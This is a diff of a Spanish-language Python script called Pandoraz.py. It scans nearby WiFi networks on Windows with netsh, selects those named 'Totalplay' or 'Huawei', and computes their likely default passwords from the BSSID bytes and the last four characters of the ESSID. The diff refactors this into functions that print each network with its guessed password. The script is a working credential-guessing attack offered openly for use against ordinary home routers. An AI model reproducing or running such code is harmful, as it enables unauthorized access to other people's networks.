@@ -9,14 +9,14 @@
 #   ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
 #   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 #                                                         By: LawlietJH
-#                                                               v1.1.8
+#                                                               v1.2.0
 
 import time
 import os
 
 
 
-Version = "v1.1.8"
+Version = "v1.2.0"
 
 
 
@@ -25,12 +25,12 @@ Version = "v1.1.8"
 
 
 Banner1 = """
-       ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
-       ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
-       ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
-       ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
-       ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
-       ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+      ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
+      ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
+      ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
+      ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
+      ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
+      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 """
 # Fuente: ANSI Shadow - http://patorjk.com/software/taag/#p=display&f=ANSI%20Shadow&t=Pandoraz
 
@@ -128,10 +128,7 @@ def HiddenCursor(imp="Hide"):
 
 Red = False
 Redes = []
-Bssids = []
-Cont = 0
-Cony = 0
-Conty = 0
+Tam = 0
 
 
 
@@ -162,7 +159,7 @@ def Plus():
 			else: xD += X
 			
 	return xD
-
+			
 
 
 def ObtenerRedes():
@@ -243,80 +240,64 @@ def ImprimirListaWifi(Datos):
 
 
 
-#=======================================================================
-
-
-
-def EscaneoDeRed():	# Escaneo De La Red En Busqueda De Redes WiFi Vulnerables.
+def getNameRedes(Datos, Pos):
 	
-	global Bssids, Redes, Red, Cont, Cony, Conty
-	Bssids, Redes, Red, Cont, Cony, Conty = [], [], [], 0, 0, 0
+	global Red, Redes
 	
-	Comando = "netsh wlan show networks mode=Bssid"
-	Cad = os.popen(Comando)
-	Cadena = Cad.read()
-	Lista = Cadena.split("\n")
+	if "Totalplay" in Datos["ESSID"][Pos]:
+			Red = True
+			Redes.append(Datos["ESSID"][Pos])
+			Redes.append(Datos["Senial"][Pos])
+			Redes.append(Datos["BSSID"][Pos])
+	
+	elif "Huawei" in str(Datos["ESSID"][Pos]):
+		
+			Red = True
+			Redes.append(Datos["ESSID"][Pos])
+			Redes.append(Datos["Senial"][Pos])
+			Redes.append(Datos["BSSID"][Pos])
 
-	for X in Lista:
-		
-		Conty += 1
-		
-		if Conty == 3:
-			print("\n\n\n\t [+] ", X, "\n\n")
-		
-		if "SSID" in X:
-			X = X.split(" : ")[1]			
-			Bssids.append(X)
 
-	for Y in Bssids:
-		
-		if Cont % 2 == 0:
-			
-			Cony += 1
-			
-			if len(Y) > 12:	print("    [*] {} - ESSID: {}".format(Cony, Y), end="\t")
-			else:			print("    [*] {} - ESSID: {}".format(Cony, Y), end="\t\t")
-				
-			if "Totalplay" in Y or "Huawei" in Y:
-				Red = True
-				Redes.append(Y)
-		else:
-			Y = Y.upper()
-			print(" BSSID: {}".format(Y))
-			
-			if Red == True:
-				Redes.append(Y)
-				Red = False
-		
-		Cont += 1
+
+def getPassRedes():
+	
+	global Redes
 	
 	Cont = 0
 	Cony = 0
 	Name = ""
 	Pass = ""
 	
+	print("\n\n\n\n [+] Contraseñas Posibles De Redes Conseguidas:")
+	
 	if len(Redes) != 0:
-		print("\n\n\n\n Posibles Contraseñas De Redes:\n")
+		
+		print("\n\n\t Red (ESSID) \t\tSeñal \t Contraseña")
 		
 		for X in Redes:
 			
 			Cont += 1
 						
-			if Cont % 2 != 0:
+			if Cont == 1:
 				
 				Cony += 1
 				
 				Name = X
 				
-				print("\n [*] {} - Red: {}".format(Cony, X), end="\t")
+				print("\n [*] {} - {} ".format(Cony, X), end="\t")
 			
-			else:
+			elif Cont == 2:
+				print(" {}".format(X), end="\t")
+				
+			elif Cont == 3:
 				
 				Name = Name[-4:]
 				X = X.split(":")
 				Pass = X[3] + X[4] + Name
 				
-				print("\t Contraseña: {}".format(Pass))
+				print("  {}".format(Pass))
+				
+				Cont = 0
 				
 	else: print("\n\n\t [!] Sin Redes Disponibles... Por Ahora...")
 
@@ -326,29 +307,30 @@ def EscaneoDeRed():	# Escaneo De La Red En Busqueda De Redes WiFi Vulnerables.
 
 
 
-while True:
+def Main():
 	
-	os.system("cls && Title Pandoraz.py                "+\
+	HiddenCursor()
+	
+	os.system("Title Pandoraz.py                "+\
 			"By: LawlietJH                "+Version+"    ")
 	
-	EscaneoDeRed()
+	print("\n\n\t\t [!] Escaneando La Red Wifi!")
 	
-	Eny = 10
-	
-	print("\n\n")
-	
-	try:
-		while True:
-			 
-			print("\r\t Actualizado En " + str(Eny) + " Segundos...", end="")
-			os.system("TimeOut /NoBreak 1 > Nul")
-			
-			if Eny == 1: break
-			
-			Eny -= 1
-	except KeyboardInterrupt:
-		print("\n\n\t [!] Saliendo...")
-		time.sleep(1.5)
-		Dat()
-		Salir(0)
+	while True:
 		
+		Datos = ObtenerRedes()
+		ImprimirListaWifi(Datos)
+		getPassRedes()
+		
+		try:
+			os.system("TimeOut /NoBreak 1 > Nul")
+		except KeyboardInterrupt:
+			print("\n\n\t [!] Saliendo...")
+			time.sleep(1.5)
+			Dat()
+			Salir(0)
+			
+
+
+Main()
+
